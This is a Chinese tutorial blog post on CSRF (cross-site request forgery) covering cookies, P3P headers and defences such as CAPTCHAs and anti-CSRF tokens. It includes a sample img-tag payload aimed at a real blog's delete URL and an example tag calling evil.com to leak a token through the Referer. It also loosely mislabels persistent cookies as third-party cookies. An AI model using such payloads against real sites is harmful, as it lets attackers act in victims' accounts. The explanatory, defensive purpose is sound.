---
title: Web安全系列——CSRF攻击
date: 2017-11-17 09:32:54
categories: Web安全
tags: [Web安全]
---

## CSRF简介
CSRF全称为Cross Site Request Forgery，翻译成中文是跨站点请求伪造，是攻击者通过伪装受信任的用户，来想网站发起请求的的一种恶意攻击。听起来很像XSS攻击，但是又与XSS攻击有着本质的不同。可以通过一个简单的例子了解CSRF攻击。  
<!-- more -->  

某个博客网站只需要在登录后，请求这个URL，即可删除编号为“2345”的博客。  

```
	http://blog.sohu.com/manage/entry.do?m=delete&id=2345
```

那么，这个URL就存在CSRF漏洞，可以被攻击者进行利用。攻击者在自己的网站中，插入一张图片，代码为

```
	<img src="http://blog.sohu.com/manage/entry.do?m=delete&id=2345" />
```

使`<img>`标签指向删除博客的URL,即可以删除该博客。  

## CSRF攻击与Cookie
虽然不利用Cookie也能进行CSRF攻击，但是绝大部分破坏力强的CSRF攻击离不开对Cookie的利用。  

浏览器的Cookie分为**两种**：一种是"Session Cookie",又称为”临时Cookie“，另一种是"Third-party Cookie",也成为”本地Cookie“。
两者的区别在于Cookie的**失效时间**。Session Cookie在浏览器关闭后，Session Cookie便马上失效。而Third-party Cookie在Set-Cookie的时候，指定了Expire时间，只有到过了Exipire的时间后，Third-party Session才会失效。  

显然，对于攻击者来说，Third-party Cookie比Session Cookie更加容易利用，从而进行CSRF攻击。因为，Third-party Cookie的有效时间更长，用户访问某个网站后，获取Third-party Cookie,那么在Third-party Cookie失效之前，用户都有遭受CSRF攻击的风险。  

而Session Cookie一般是存放在浏览器的内存中，浏览器关闭就自动失效。攻击者要利用Session Cookie进行攻击的话，还需要先诱使用户访问目标网站，是Session有效，才能进行下一步攻击。  
## 进一步探究Cookie
因为第三方Cookie容易被黑客利用，所以一些浏览器会拦截第三方Cookie的发送，如Edge:
![Edge浏览器中的Cookie设置](https://wx1.sinaimg.cn/mw690/857afa84gy1fll5gmzshwj20a00bl0sy.jpg)

这在某种程度上加大了CSRF攻击的难度。然而P3P Header又使浏览器可以发送第三方Cookie了。  

> P3P Header是W3C制定的关于隐私的标准。  

如在Set-Cookie的时候加上P3P头，那即使浏览器禁止发送第三方Cookie，第三方Cookie也会被发送。因此，对于CSRF的防御不能仅仅依赖浏览器对第三方Cookie的拦截。
## CSRF的防御
CSRF是一种难以识别的攻击，对于CSRF的防御可以采取以下措施。
### 验证码
CSRF攻击是伪造成用户的身份，自动发起恶意的请求。那么我们可以强迫攻击者与我们的网站进行交互。在一些操作之前加入验证码校验，可以抵御一部分的CSRF攻击。但是加入验证码会影响用户的体验，所以验证码不能作为主要的防御手段。
### Anti CSRF Token
CSRF攻击的原理，是攻击者伪装成用户身份，发起恶意请求。那么攻击者除了要伪装成功，还需要“猜”出请求的参数。那么如果我们在请求中，加入一个随机的Token，攻击者就永远没有办法”猜“出恶意请求的参数了，这就是Anti CSRF Token。  
Token参数最好放在一个表单中，而不是放在URL里面。比如以下URL。
  
```
	http://host/path/manage?username=abc&token=[random]
```

因为攻击者可以在当前页面植入恶意的脚本如：

```
<img src="http://evil.com/notexist">
```

则当前页面的  URL回作为HTTP请求的Refferer，发送到evil.com服务器上。因此，最好把Token放在表单中，把敏感操作由GET改为POST,这样可以增加黑客进行CSRF攻击的难度。  

一定要记住的一点是：** Anti CSRF Token 仅仅是用来防御CSRF攻击，而不能防御XSS攻击。XSS攻击必须要采用响应的防御手段。**